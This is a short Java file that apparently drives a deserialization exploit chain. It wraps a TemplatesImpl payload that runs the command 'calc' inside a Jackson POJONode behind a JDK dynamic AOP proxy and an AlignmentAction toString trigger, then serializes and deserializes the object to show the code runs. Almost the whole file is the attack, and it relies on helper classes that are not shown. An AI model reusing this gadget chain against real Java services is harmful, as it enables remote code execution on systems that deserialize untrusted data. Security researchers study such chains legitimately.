package cn.org.unk;

public class Main {
    public static void main(String[] args) throws Exception{


        Object calc = Gadget.getPOJONodeWithJdkDynamicAopProxy(Gadget.getTemplatesImpl("calc"));
        Object alignmentActionForToString = Gadget.getAlignmentActionForToString(calc);

        Util.unserialize(Util.serialize(alignmentActionForToString));



    }
}
